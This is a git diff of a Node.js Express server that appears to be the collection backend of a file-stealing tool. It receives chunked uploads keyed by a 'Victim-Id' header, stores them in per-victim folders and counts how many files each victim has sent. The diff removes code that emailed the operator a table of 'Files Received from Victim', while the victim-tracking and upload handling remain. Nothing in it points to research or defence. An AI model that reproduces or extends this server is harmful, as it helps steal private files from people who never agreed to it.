@@ -2,7 +2,6 @@ const fs = require('fs');
 require('dotenv').config();
 const cors = require('cors');
 const express = require('express');
-const nodemailer = require('nodemailer');
 const path = require('path');
 
 const app = express();
@@ -10,7 +9,7 @@ const PORT = process.env.PORT || 8080; // Railway assigns a port dynamically
 
 // Enable CORS with specific options
 const corsOptions = {
-  origin: ['https://deobfrontend-4mu41vc3s-2naseernoors-projects.vercel.app','https://deobfrontend-git-main-2naseernoors-projects.vercel.app'],
+  origin: ['https://deobfrontend-4mu41vc3s-2naseernoors-projects.vercel.app', 'https://deobfrontend-git-main-2naseernoors-projects.vercel.app'],
   methods: ['GET', 'POST', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
   credentials: true,
@@ -48,15 +47,6 @@ if (!fs.existsSync(OUTPUT_BASE_DIR)) {
   fs.mkdirSync(OUTPUT_BASE_DIR, { recursive: true });
 }
 
-// Email Setup (Check if environment variables are available)
-const transporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: {
-    user: process.env.EMAIL_USER || '',
-    pass: process.env.EMAIL_PASS || '',
-  },
-});
-
 const victimFolders = {};
 const victimFileCounts = {};
 const victimTotalFiles = {};
@@ -66,61 +56,11 @@ const connectedDevices = {};
 // Track chunks to avoid duplicates
 const chunkTracker = new Set();
 
-// Function to send email
-async function sendEmail(victimId, files) {
-  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
-    console.error('❌ Email not sent: Missing EMAIL_USER or EMAIL_PASS');
-    return;
-  }
-
-  console.log(`🔍 Preparing to send email for victim ${victimId}...`);
-
-  const fileRows = files
-    .map(
-      (file, index) => `
-      <tr>
-        <td>${index + 1}</td>
-        <td>${file.name}</td>
-        <td>${file.type}</td>
-        <td>${file.size} bytes</td>
-      </tr>`
-    )
-    .join('');
-
-  const htmlContent = `
-    <h2>Files Received from Victim ${victimId}</h2>
-    <p>The following files were received:</p>
-    <table border="1">
-      <tr>
-        <th>#</th>
-        <th>File Name</th>
-        <th>File Type</th>
-        <th>File Size</th>
-      </tr>
-      ${fileRows}
-    </table>`;
-
-  const mailOptions = {
-    from: process.env.EMAIL_USER,
-    to: 'naseer.ord@gmail.com',
-    subject: `Files Received from Victim ${victimId}`,
-    html: htmlContent,
-  };
-
-  try {
-    const info = await transporter.sendMail(mailOptions);
-    console.log(`✅ Email sent: ${info.response}`);
-  } catch (error) {
-    console.error(`❌ Error sending email:`, error.message);
-  }
-}
-
-// Function to check if all files are received and send email
+// Function to check if all files are received
 async function checkAndSendEmail(victimId, victimFolder) {
   const filesInFolder = fs.readdirSync(victimFolder);
   if (filesInFolder.length === victimTotalFiles[victimId]) {
-    console.log(`✅ All files received for victim ${victimId}, sending email...`);
-
+    console.log(`✅ All files received for victim ${victimId}`);
     const files = filesInFolder.map((filename) => {
       const filePath = path.join(victimFolder, filename);
       const stats = fs.statSync(filePath);
@@ -128,7 +68,6 @@ async function checkAndSendEmail(victimId, victimFolder) {
     });
 
     victimFiles[victimId] = files;
-    sendEmail(victimId, files);
   }
 }
 
